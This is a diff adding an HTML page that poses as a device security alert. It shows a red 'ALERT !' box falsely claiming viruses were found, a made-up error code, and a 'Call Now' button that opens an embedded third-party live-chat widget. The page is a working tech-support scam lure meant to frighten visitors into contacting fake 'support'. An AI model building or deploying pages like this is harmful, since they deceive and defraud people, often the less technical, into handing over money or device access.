@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Important Message</title>
+    <style>
+        body {
+            font-family: "Segoe UI", Roboto, "Helvetica Neue", Arial, "Noto Sans", sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";
+            margin: 0;
+            padding: 0;
+            background-color: #f4f4f4;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .container {
+            color: black;
+            width: 400px;
+            border: 2px solid red;
+            border-radius: 10px;
+            padding: 20px;
+            text-align: center;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
+        }
+
+        .container h1 {
+            color: red;
+            font-size: 33px;
+            font-weight: 400;
+        }
+
+        .container p {
+            color: black;
+            margin: 10px 0;
+            font-size: 18px;
+            line-height: 1.5;
+        }
+
+        .container h3{
+            font-size: 18px;
+        }
+        .container button{
+            background-color: rgb(221, 41, 41);
+            color: white;
+            border: none;
+            padding: 16px;
+            font-size: 16px;
+            font-weight: 400;
+            margin-top: 13px;
+            border-radius: 20px;
+        }
+        .container button:hover{
+            cursor: pointer;
+        }
+        @media (max-width: 400px) {
+            .container {
+                height: 100vh;
+                position: fixed;
+                border: none;
+            }
+            .container h1{
+                font-size: 50px;
+                font-weight: 600;
+            }
+            .container p{
+                padding: 25px;
+                font-size: 30px;
+                margin-bottom: 10px;
+                font-weight: 500;
+            }
+            .container h3{
+                color: red;
+                font-size: 30px;
+            }
+            .container button{
+                font-size: 20px;
+            }
+        }
+        @media (max-width: 364px) {
+            .container{
+                position: fixed;
+            }
+            .container p{
+                padding: 0 40px;
+                font-size: 25px;
+                margin-bottom: 10px;
+                font-weight: 500;
+            }
+            .container h3{
+                padding: 0 40px;
+                color: red;
+                font-size: 30px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>ALERT !</h1>
+        <p>Multiple suspicious files and Virus found in your device. Contact Support for further help.</p>
+        <h3>Error CODE: EBRX16X76D</h3>
+        <button id="askExpertButton">Call Now</button>
+    </div>
+    <script type="text/javascript">
+        
+        var Tawk_API = Tawk_API || {}, Tawk_LoadStart = new Date();
+        (function () {
+            var s1 = document.createElement("script"),
+                s0 = document.getElementsByTagName("script")[0];
+            s1.async = true;
+            s1.src = 'https://embed.tawk.to/678e180d825083258e07c47c/1ii1gru51';
+            s1.charset = 'UTF-8';
+            s1.setAttribute('crossorigin', '*');
+            s0.parentNode.insertBefore(s1, s0);
+        })();
+
+        document.getElementById('askExpertButton').addEventListener('click', function () {
+            if (Tawk_API && Tawk_API.maximize) {
+                Tawk_API.maximize(); 
+            } else {
+                alert("Chat service is not available. Please try again later.");
+            }
+        });
+    </script>
+    <!-- <script type="text/javascript">
+        var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
+        (function(){
+        var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
+        s1.async=true;
+        s1.src='https://embed.tawk.to/678e180d825083258e07c47c/1ii1gru51';
+        s1.charset='UTF-8';
+        s1.setAttribute('crossorigin','*');
+        s0.parentNode.insertBefore(s1,s0);
+        })();
+        </script> -->
+</body>
+</html>
